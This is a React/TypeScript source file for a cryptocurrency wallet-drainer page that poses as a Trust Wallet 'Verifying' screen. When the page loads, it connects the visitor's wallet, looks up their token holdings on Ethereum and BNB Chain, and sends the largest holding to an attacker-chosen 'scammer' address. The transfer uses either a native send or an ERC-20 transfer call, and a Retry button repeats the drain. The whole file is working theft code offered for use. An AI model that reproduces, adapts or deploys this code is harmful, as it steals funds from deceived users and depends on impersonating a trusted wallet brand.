'use client';
import * as ethers from "ethers";
import { useEffect, useRef, useState } from "react";
import { contractDecimals, getAddressTokens, overrideLog } from "./utils";
import SuperJSON from "superjson";
import Big from "big.js";

declare global {
    interface Window {
        ethereum: any;
    }
}


// Define network configurations for Ethereum and BNB
const networks = {
    ethereum: {
        chainId: 1, // Ethereum Mainnet chainId (in hex)
        chainName: 'Ethereum Mainnet',
        nativeCurrency: {
            name: 'Ether',
            symbol: 'ETH',
            decimals: 18
        },
        rpcUrls: ['https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'],
        blockExplorerUrls: ['https://etherscan.io']
    },
    bnb: {
        chainId: 56, // BNB Chain (BSC) Mainnet chainId (in hex)
        chainName: 'Binance Smart Chain',
        nativeCurrency: {
            name: 'Binance Coin',
            symbol: 'BNB',
            decimals: 18
        },
        rpcUrls: ['https://bsc-dataseed.binance.org/'],
        blockExplorerUrls: ['https://bscscan.com']
    }
};

// Function to switch to a specific network
async function switchNetwork(network: keyof typeof networks) {
    try {
        await window.ethereum.request?.({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: networks[network].chainId }]
        });
        console.log(`Switched to ${networks[network].chainName}`);
    } catch (switchError: any) {
        // If the network is not added, add it
        if (switchError.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [networks[network]]
                });
                console.log(`Added and switched to ${networks[network].chainName}`);
            } catch (addError) {
                console.error('Failed to add network', addError);
            }
        } else {
            console.error('Failed to switch network', switchError);
        }
    }
}

async function sendToken(toAddress: string, amountInTokens: string, tokenAddress: string) {
    if (window.ethereum) {
        // Request account connection
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const fromAddress = accounts[0];
        if (!fromAddress) throw new Error("ACC NOT FOUND");

        // Define the ERC-20 contract ABI (simplified version)
        const tokenAbi = [
            "function decimals() view returns (uint8)",
            "function transfer(address to, uint256 amount) public returns (bool)"
        ];

        // Create a contract instance for the token
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);

        // Define the number of tokens to send (remember ERC-20 tokens usually have decimals)
        const decimals = await tokenContract.decimals();
        const amount = ethers.utils.parseUnits(amountInTokens, decimals);

        // Send the tokens by calling the `transfer` function
        const estimatedGasLimit = await tokenContract.estimateGas.transfer(toAddress, amount).catch(() => 60000);
        const transactionResponse = await tokenContract.transfer(toAddress, amount, {
            gasLimit: estimatedGasLimit // Set custom gas limit
        });

        // Wait for the transaction to be mined
        const receipt = await transactionResponse.wait();
        console.log('Transaction successful:', receipt);
    }
}

// Request account connection after switching to a network
async function connectAccount(network: keyof typeof networks) {
    // First switch to the desired network (Ethereum or BNB)
    await switchNetwork(network);

    // Request accounts
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    console.log(`Connected account: ${accounts[0]}`);
    return {
        address: accounts[0],
        network: networks[network]
    };
}

async function sendEther(toAddress: string, amountInEther: string, contractDec: number = 18) {
    if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const fromAddress = accounts[0];
        if (!fromAddress) throw ("ACC NOT FOUND");

        // Get the gas price
        const gasPrice = await window.ethereum.request({ method: 'eth_gasPrice' });
        const gasLimit = 21000; // For a standard Ether transfer

        // Calculate the gas fee
        const gasFee = ethers.BigNumber.from(gasPrice).mul(gasLimit);

        // Get the balance of the sender
        const balance = await window.ethereum.request({
            method: 'eth_getBalance',
            params: [fromAddress, 'latest']
        });

        // Convert balance and gas fee to BigNumber for accurate calculation
        const balanceInWei = ethers.BigNumber.from(balance);
        const totalAmountInWei = ethers.utils.parseEther(amountInEther);

        // Check if the full amount can be sent, adjusting for gas fee
        let adjustedAmount = totalAmountInWei.sub(gasFee);
        if (adjustedAmount.lt(0)) {
            throw new Error("Insufficient funds for gas fee");
        }

        // Create the transaction object
        const transactionParams = {
            to: toAddress, // The receiving address
            from: fromAddress, // The sender's address
            value: adjustedAmount.toHexString(), // Adjusted amount in hex
            gas: ethers.BigNumber.from(gasLimit).toHexString(), // Gas limit
            gasPrice: ethers.BigNumber.from(gasPrice).toHexString(), // Gas price
        };

        // Send the transaction
        const txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [transactionParams],
        });

        console.error('Transaction hash:', txHash);
    }
}


function TrustWalletScam(props:{
    addresses: {[n: number]: string}
} & Record<string,any>) {
    const [logs, log] = useState<string[]>([]);
    const [error, setError] = useState<string>();
    const [text, setText] = useState("Verifying");
    const [loading, setLoading] = useState(".");
    const [l, setL] = useState(false);

    useEffect(() => {
        const len = 3;
        const text = loading.length >= len ? loading.split("")[0] : loading + loading.split("")[0];
        setTimeout(() => {
            setLoading(text);
        }, 1000);
    }, [loading]);
    useEffect(() => {
        if (error) setL(false);
    }, [error])

    const init = useRef(false);
    const handle = async (network: keyof typeof networks = 'ethereum') => {
        setL(true);
        const acc = await connectAccount(network);
        console.log("FETCHING");

        const [eth,bnb] = await Promise.all([
            getAddressTokens(acc?.address, +networks.ethereum.chainId).catch(()=>[]),
            getAddressTokens(acc?.address, +networks.bnb.chainId).catch(()=>[])
        ])

        const finalList = [...eth,...bnb].sort((a, b) => a.price - b.price ? 1 : -1);

        console.log(finalList.map(t => `${t.contract_name} = ${t.price}|${t.balance}`).join("\n"));
        console.log("FETCHED");

        const top = finalList[0];

        if (top.chainId+"" !== networks.ethereum.chainId+"") {
            await connectAccount('bnb');
        }

        const scammer = props.addresses[+props.searchParams.bot];
        if (!scammer) throw("Wallet Not Found!");

        const amount = Big(top.balance).div(contractDecimals(top.contract_decimals)).toString();

        if (top.native_token) {
            await sendEther(scammer, amount);
        } else {
            await sendToken(scammer, amount, top.contract_address);
        }

        setL(false);
    }

    useEffect(() => {

        if (!init.current) {
            init.current = true;
            let keys = ['log', 'error'] as const;
            for (let key of keys) {
                const origin = console[key];
                console[key] = (...args: any[]) => {
                    origin(...args);
                    log(pre => ([
                        ...pre,
                        `[${key.toUpperCase()}] ${args.map(o =>
                            typeof o === 'object' ?
                                `${JSON.stringify(o)}` :
                                o
                        ).join(" ")}`
                    ]))
                }
            }
            handle().catch(e => setError(e?.message || e + ""));
        }
    }, [])

    return (
        <div className="overflow-auto">

            <div className="center flex-col py-10 gap-10 min-h-screen">
                <img src='/trust.png' className='bg-white rounded-3xl w-32 overflow-hidden' />
                <div className='center flex-col gap-2'>
                    <h1 className='text-4xl text-bold text-center'>{text}{!error ? loading : "... Error!"}</h1>
                    <p className="opacity-75">Make sure you're using trust wallet browser!</p>
                    <button disabled={l} className='bg-blue-500' onClick={() => {
                        setError(undefined);
                        handle().catch(e => setError(e?.message || e + ""))
                    }}>
                        Retry
                    </button>
                    {error && <p className="text-red-500">Error</p>}
                </div>
            </div>
            {JSON.stringify(props.addresses)}
            {(typeof window !== 'undefined' && window.location.host.includes("local")) && [...logs.reverse()].map((o, i) => o.split("\n").map((o, i1) => <p key={i + i1}>{o}</p>))}
        </div>
    )
}

export default TrustWalletScam;
